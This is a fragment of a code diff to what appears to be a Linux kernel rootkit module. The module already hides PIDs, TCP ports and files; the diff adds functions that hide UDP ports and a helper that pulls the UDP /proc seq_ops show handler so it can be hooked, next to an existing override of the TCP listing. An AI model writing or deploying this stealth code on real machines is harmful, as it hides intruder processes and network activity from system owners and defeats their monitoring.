@@ -319,7 +319,7 @@ void pid_remove_all(void)
 // ========== END PID LIST ==========
 
 
-// ========== PORT LIST ==========
+// ========== TCP PORT LIST ==========
 
 struct hidden_port {
     //unsigned short port;
@@ -364,8 +364,43 @@ void unhide_tcp4_port(const char *port)
     }
 }
 
-// ========== END PORT LIST ==========
+// ========== END TCP PORT LIST ==========
 
+
+// ========== UDP PORT LIST ==========
+
+void hide_udp4_port (const char *port)
+{
+    struct hidden_port *hp;
+
+    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
+    if ( ! hp )
+        return;
+
+    //hp->port = port;
+    hp->port = simple_strtoul(port, NULL, 10);
+
+    list_add(&hp->list, &hidden_udp4_ports);
+}
+
+void unhide_udp4_port (const char *port)
+{
+    struct hidden_port *hp;
+	
+    unsigned long port_num = simple_strtoul(port, NULL, 10);
+
+    list_for_each_entry ( hp, &hidden_udp4_ports, list )
+    {
+        if ( port_num == hp->port )
+        {
+            list_del(&hp->list);
+            kfree(hp);
+            break;
+        }
+    }
+}
+
+// ========== END UDP PORT LIST ==========
 
 
 // ========== FILE LIST ==========
@@ -542,6 +577,32 @@ void *get_tcp_seq_show ( const char *path )
 
     return ret;
 }
+
+
+void *get_udp_seq_show ( const char *path )
+{
+    void *ret;
+    struct file *filep;
+    struct udp_seq_afinfo *afinfo;
+
+    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
+        return NULL;
+
+    #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+    afinfo = PDE(filep->f_dentry->d_inode)->data;
+    #elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+    afinfo = PDE_DATA(filep->f_dentry->d_inode);
+    #else
+    afinfo = PDE_DATA(filep->f_path.dentry->d_inode);
+    #endif
+
+    ret = afinfo->seq_ops.show;
+
+    filp_close(filep, 0);
+
+    return ret;
+}
+
 
 static int n_tcp4_seq_show ( struct seq_file *seq, void *v)
 {
